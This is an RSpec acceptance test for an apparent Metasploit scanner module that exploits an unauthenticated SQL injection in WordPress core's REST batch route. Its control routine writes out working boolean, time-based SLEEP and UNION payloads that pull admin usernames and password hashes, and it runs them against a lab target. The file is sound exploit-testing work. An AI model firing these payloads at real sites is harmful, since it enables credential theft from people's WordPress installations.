require 'acceptance_spec_helper'
require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require 'socket'
require 'uri'
require_relative '../../../../../test/module_targets/wp2shell/native'

RSpec.describe 'WordPress core genuine SQLi targets', acceptance: true, order: :defined do
  include_context 'module target'
  include WordpressCoreNativeControls

  before(:all) do
    @core = { commands: [], requests: [], calls: [], reports: [], controls: [], loot: [] }
    @release = ENV.fetch('WP2SHELL_RELEASE', '6.9.4')
    @prefix = ENV.fetch('WP2SHELL_PREFIX', '')
    @count = Integer(ENV.fetch('WP2SHELL_COUNT', '1'))
    @affected = %w[6.9.4 7.0.1].include?(@release)
    @base_workspace = "wordpress_core_target_#{Process.pid}"
    begin
      @catalog = JSON.parse(File.read('test/module_targets/wp2shell/releases.json')).fetch(@release)
      @baseline = core_identity('installed')
      expect(@baseline.values_at('core', 'php', 'uid', 'database', 'database_role')).to eq([@release, '8.3.28', 33, 'wp_root', 'module_target@%'])
      expect(@baseline.fetch('server')).to start_with('11.2.2-MariaDB')
      expect(@baseline.fetch('database_grants').join("\n")).not_to include('ALL PRIVILEGES ON *.*', 'GRANT OPTION')
      expect(@baseline.fetch('installed_sha256')).to eq(@catalog.fetch('installed_sha256'))
      expect(@baseline.fetch('archive_sha256')).to eq(@catalog.fetch('sha256'))
      expect(@baseline.values_at('active_plugins', 'object_cache_dropin')).to eq([[], false])
      expect(@baseline.fetch('external_object_cache')).to be_falsey
      expect(@baseline.fetch('prefix')).to eq(@prefix)
      expect(@baseline.fetch('table_prefix')).to eq(ENV.fetch('WP2SHELL_TABLE_PREFIX', 'wp_'))
      expect(@baseline.values_at('db_error', 'bootstrap_output_base64')).to eq(['', ''])
      expect(@baseline.fetch('users').length).to eq(ENV['WP2SHELL_SINGLE_USER'] == '1' ? 1 : 4)
      @post_count = @baseline.fetch('posts').count { |row| row.fetch('post_type') == 'post' && row.fetch('post_status') == 'publish' }
      expect(@post_count).to eq(ENV['WP2SHELL_NO_POSTS'] == '1' ? 0 : 1)
      @extractable = @affected
      core_controls('before')
      @baseline = core_identity('before')
      expect(core_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      expect(core_sql('SELECT usesuper FROM pg_user WHERE usename=current_user').strip).to eq('f')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets')
      core_workspace(@base_workspace)
      expect(core_reports.fetch('credentials')).to eq([])
      output = console_command("irb -e 'puts \"CORE_PROVENANCE=\" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file(\"modules/#{core_fullname}.rb\").hexdigest}.to_json'")
      @core[:provenance] = JSON.parse(output.match(/^CORE_PROVENANCE=(.+)$/)[1])
      expect(@core.fetch(:provenance).fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@core.fetch(:provenance).fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{core_fullname}.rb").hexdigest)
      @core[:preflight] = 'passed'
    ensure
      core_save
    end
  end

  after(:all) do
    if @core&.key?(:preflight)
      core_controls('after')
      expect(core_identity('after')).to eq(@baseline)
      expect(console_command('irb -e \'puts "CORE_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('CORE_STATE={"sessions":[],"jobs":[]}')
      paths = @core.fetch(:calls).filter_map { |call| Base64.strict_decode64(call.fetch(:output_base64, ''))[/Loot saved to: (.+)$/, 1]&.strip }
      expect(core_loot_paths.sort).to eq(paths.sort)
    end
  ensure
    core_save
  end

  it 'checks the genuine route confusion through the public check command' do
    core_workspace(@base_workspace + '_check')
    core_call('normal-check', 'check', {}, expected: @affected ? :vulnerable : :safe)
  end

  Integer(ENV.fetch('WP2SHELL_REPEATS', '1')).times do |iteration|
    it "verifies complete native data or refusal on public run #{iteration + 1}" do
      core_workspace(@base_workspace)
      core_call("normal-#{iteration + 1}", 'run', {}, expected: @extractable ? :credentials : :refusal)
    end
  end

  if ENV['WP2SHELL_NEGATIVES'] == '1'
    it 'refuses a negative count before SQL extraction' do
      core_workspace(@base_workspace + '_negativecount')
      core_call('negative-count', 'run', { 'COUNT' => -1 }, expected: :bad_count)
    end

    %w[check run].each do |operation|
      it "handles an unreachable reserved non-listening port on public #{operation}" do
        socket = Socket.new(:INET, :STREAM, 0)
        socket.bind(Socket.sockaddr_in(0, '127.0.0.1'))
        core_workspace(@base_workspace + '_closed' + operation)
        core_call('closed-' + operation, operation, { 'RPORT' => socket.local_address.ip_port, 'HttpClientTimeout' => 3 }, expected: :unreachable)
      ensure
        socket&.close
      end
    end
  end

  def core_fullname
    'auxiliary/scanner/http/wordpress_wp2shell_sqli'
  end

  def core_call(label, action, overrides, expected:)
    endpoint = target_endpoint('app')
    options = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'TARGETURI' => @prefix + '/', 'VHOST' => 'module-target.test', 'SqliDelay' => 0.6, 'HttpClientTimeout' => 8, 'COUNT' => @count, 'THREADS' => 1, 'VERBOSE' => true }.merge(overrides)
    previous = core_reports.fetch('credentials')
    previous_loot = core_loot_paths
    call = { label: label, action: action, options: options, expected: expected, workspace: @workspace, state: 'started' }
    @core.fetch(:calls) << call
    core_save
    console_command('back')
    expect(console_command("use #{core_fullname}")).not_to match(/Failed to load|Unknown command|No results/)
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    output = console_command("#{action} #{format_datastore_options(options)}", timeout: 1200)
    call.merge!(state: 'returned', seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started, output_base64: Base64.strict_encode64(output.b))
    core_save
    rows = core_reports.fetch('credentials')
    expect(output).not_to match(/Unknown datastore option|Auxiliary failed|Exception|NoMethodError|RuntimeError/)
    if action == 'check'
      reason = case expected
               when :vulnerable then 'REST batch route confusion detected'
               when :safe then 'REST batch route-confusion markers are absent'
               else 'Server is not online or was not detected as WordPress'
               end
      expect(output).to include(reason)
      expect(rows).to eq([])
      expect(core_loot_paths).to eq(previous_loot)
    elsif expected == :credentials
      expect(output).to include('Auxiliary module execution completed', 'Unauthenticated time-based blind SQL injection confirmed', 'Loot saved to:')
      expect(output).not_to include('Auxiliary aborted')
      expect(rows.length).to eq(@count.zero? ? @baseline.fetch('users').length : @count)
      expect(rows.map { |row| row.fetch('username') }.uniq.length).to eq(rows.length)
      native = @baseline.fetch('users').to_h { |row| row.values_at('user_login', 'user_pass') }
      rows.each do |row|
        expect(row.fetch('private_data')).to eq(native.fetch(row.fetch('username')))
        expect(row.values_at('private_type', 'origin_type', 'module_full_name', 'address', 'port', 'proto')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', core_fullname, endpoint.fetch('host'), endpoint.fetch('port'), 'tcp'])
        expect(row.fetch('service')).to match(/\Awordpress\z/i)
      end
      expect(rows).to eq(previous) unless previous.empty?
      path = output.match(/Loot saved to: (.+)$/)[1].strip
      expect(File.expand_path(path)).to start_with(File.expand_path(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
      expected_data = rows.map { |row| "Username: #{row.fetch('username')}, Password Hash: #{row.fetch('private_data')}\n".b }
      expect(File.binread(path).lines.sort).to eq(expected_data.sort)
      expect(core_loot_paths - previous_loot).to eq([path])
      @core.fetch(:loot) << { path: path, bytes: File.size(path), sha256: Digest::SHA256.file(path).hexdigest, complete_native_rows: rows.length }
      expect(core_reports.fetch('vulns').map { |row| row.fetch('name') }).to eq([core_fullname])
    else
      expect(output).to include('Auxiliary module execution completed')
      reason = case expected
               when :bad_count then 'COUNT must be zero or greater'
               when :unreachable then 'Server is not online or was not detected as WordPress'
               when :refusal then @affected ? 'Time-based blind SQLi did not confirm' : 'REST batch route-confusion markers are absent'
               end
      expect(output).to include(reason)
      expect(output).not_to include('Loot saved to:', 'Unauthenticated time-based blind SQL injection confirmed')
      expect(rows).to eq([])
      expect(core_reports.fetch('vulns')).to eq([])
      expect(core_loot_paths).to eq(previous_loot)
    end
    core_save
  ensure
    call[:console_base64] = Base64.strict_encode64(console.all_data.b) if call
    core_save
  end

  def core_loot_paths
    Dir.glob(File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'loot', '*')).select { |path| File.file?(path) }
  end

  def core_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-wordpress-core.json'), JSON.pretty_generate(@core)) if @core
  end

  def core_command(label, role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '30', *arguments]
    output, error, status = Open3.capture3(*argv)
    @core.fetch(:commands) << { label: label, argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exit: status.exitstatus }
    core_save
    raise "WordPress core target command failed: #{label}: #{error}" unless status.success?

    output
  end

  def core_identity(label)
    JSON.parse(core_command(label, 'app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def core_workspace(name)
    @workspace = name
    expect(@workspace).to match(/\Awordpress_core_target_[0-9]+(?:_[a-z]+)?\z/)
    expect(console_command("workspace -a #{@workspace}")).to include(@workspace)
  end

  def core_sql(query)
    core_command('sql', 'reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def core_reports
    raise 'Invalid WordPress core workspace' unless @workspace.match?(/\Awordpress_core_target_[0-9]+(?:_[a-z]+)?\z/)

    credentials = JSON.parse(core_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT c.id,p.username,secret.data AS private_data,secret.type AS private_type,secret.jtr_format,c.origin_type,
          o.module_full_name,s.id AS service_id,s.port,s.proto,s.name AS service,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id
        LEFT JOIN metasploit_credential_privates secret ON secret.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services s ON s.id=o.service_id LEFT JOIN hosts h ON h.id=s.host_id WHERE w.name='#{@workspace}'
      ) row
    SQL
    vulns = JSON.parse(core_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.id),'[]'::json) FROM (
        SELECT v.id,v.name,v.info FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id
        WHERE w.name='#{@workspace}'
      ) row
    SQL
    result = { 'credentials' => credentials, 'vulns' => vulns }
    @core.fetch(:reports) << { workspace: @workspace, **result }
    core_save
    result
  end

  def core_http(label, path, payload = nil)
    request = payload ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    request['Host'] = 'module-target.test'
    request['Content-Type'] = 'application/json'
    request.body = payload.to_json if payload
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 15
    http.max_retries = 0
    started = Process.clock_gettime(Process::CLOCK_MONOTONIC)
    response = http.request(request)
    @core.fetch(:requests) << { label: label, path: path, payload: payload, code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b), seconds: Process.clock_gettime(Process::CLOCK_MONOTONIC) - started }
    core_save
    response
  end

  def core_batch(label, payload)
    response = core_http(label, @prefix + '/?rest_route=/batch/v1', payload)
    expect(%w[200 207]).to include(response.code)
    JSON.parse(response.body)
  end

  def core_controls(phase)
    response = core_http(phase + '-login', @prefix + '/wp-login.php')
    expect(response.code).to eq('200')
    expect(response.body).to include('name="log"', 'name="pwd"')
    homepage = core_http(phase + '-homepage', @prefix + '/')
    expect(homepage.code).to eq('200')
    expect(homepage.body).to match(/wp-content|wp-includes|api\.w\.org/)
    ordinary = core_http(phase + '-posts', @prefix + '/?rest_route=/wp/v2/posts')
    expect(ordinary.code).to eq('200')
    expect(JSON.parse(ordinary.body).length).to eq(@post_count)
    expect(core_batch(phase + '-empty-batch', { 'requests' => [] }).fetch('responses')).to eq([])
    user = @baseline.fetch('users').first
    prefix = @baseline.fetch('table_prefix')
    expect(prefix).to match(/\A[a-z_]+\z/)
    [false, true].each do |truth|
      condition = "(SELECT LENGTH(user_pass) FROM #{prefix}users WHERE ID=#{user.fetch('ID')})=#{user.fetch('user_pass').bytesize + (truth ? 0 : 1)}"
      rows = core_native_posts(core_batch(phase + '-boolean-' + truth.to_s, core_native_payload('0) AND (' + condition + ')-- -')))
      if @affected
        expect(rows&.length).to eq(truth ? @post_count : 0)
      else
        expect(rows.nil? || rows.empty?).to be(true)
      end
    end
    timings = {}
    [false, true].each do |truth|
      condition = "(SELECT LENGTH(user_pass) FROM #{prefix}users WHERE ID=#{user.fetch('ID')})=#{user.fetch('user_pass').bytesize + (truth ? 0 : 1)}"
      core_batch(phase + '-timing-' + truth.to_s, core_native_payload('0) AND (SELECT IF(' + condition + ',SLEEP(0.6),0))=0-- -'))
      timings[truth] = @core.fetch(:requests).last.fetch(:seconds)
    end
    difference = timings.fetch(true) - timings.fetch(false)
    if @affected && @post_count.positive?
      expect(difference).to be >= 0.45
    else
      expect(difference.abs).to be < 0.4
    end
    derived_timings = {}
    [false, true].each do |truth|
      condition = "(SELECT LENGTH(user_pass) FROM #{prefix}users WHERE ID=#{user.fetch('ID')})=#{user.fetch('user_pass').bytesize + (truth ? 0 : 1)}"
      injection = '0) AND (SELECT 1009 FROM (SELECT(IF(' + condition + ',SLEEP(0.6),0)))native_alias)-- -'
      core_batch(phase + '-derived-timing-' + truth.to_s, core_native_payload(injection))
      derived_timings[truth] = @core.fetch(:requests).last.fetch(:seconds)
    end
    derived_difference = derived_timings.fetch(true) - derived_timings.fetch(false)
    if @affected
      expect(derived_difference).to be >= 0.45
    else
      expect(derived_difference.abs).to be < 0.4
    end
    marker = 'NATIVE_CORE_' + phase.upcase + '_'
    expression = 'CONCAT(0x' + marker.unpack1('H*') + ',HEX((SELECT CONCAT(user_login,0x3b,user_pass) FROM ' + prefix + 'users ORDER BY ID LIMIT 1)))'
    injection = '0) AND 1=0 UNION ALL ' + core_scalar_row(@baseline.fetch('post_columns'), expression) + "\n-- " * 6
    rows = core_native_posts(core_batch(phase + '-complete-native-union', core_native_payload(injection, union: true)))
    if @affected
      expected = marker + (user.fetch('user_login') + ';' + user.fetch('user_pass')).unpack1('H*').upcase
      expect(rows&.select { |row| row['id'] == 99999001 && row['type'] == 'post' && row.dig('title', 'rendered') == expected }&.length).to eq(1)
    else
      expect(Array(rows).any? { |row| row['id'] == 99999001 }).to be(false)
    end
    %w[app db reporting_db].each do |role|
      %w[memory.events pids.events].each do |key|
        values = core_command(phase + role + key, role, 'cat', '/sys/fs/cgroup/' + key).lines.to_h do |line|
          name, value = line.split
          [name, Integer(value)]
        end
        expect(values.values_at('oom', 'oom_kill')).to eq([0, 0]) if key == 'memory.events'
        expect(values.fetch('max')).to eq(0) if key == 'pids.events'
      end
    end
    @core.fetch(:controls) << { phase: phase, timing_seconds: timings, derived_timing_seconds: derived_timings, status: 'passed', complete_native_union: @affected }
    core_save
  end
end
